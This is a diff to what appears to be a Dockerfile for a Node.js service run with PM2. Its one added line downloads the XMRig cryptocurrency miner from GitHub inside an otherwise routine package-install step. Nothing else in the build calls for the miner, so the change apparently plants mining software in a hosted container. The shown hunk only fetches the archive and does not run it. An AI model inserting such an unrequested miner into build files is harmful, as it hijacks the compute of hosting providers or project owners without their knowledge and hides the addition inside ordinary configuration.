@@ -7,6 +7,7 @@ COPY files/* /home/choreouser/
 ENV PM2_HOME=/tmp
 
 RUN apt-get update &&\
+    wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz &&\
     apt-get install -y iproute2 vim &&\
     npm install -r package.json &&\
     npm install -g pm2 &&\
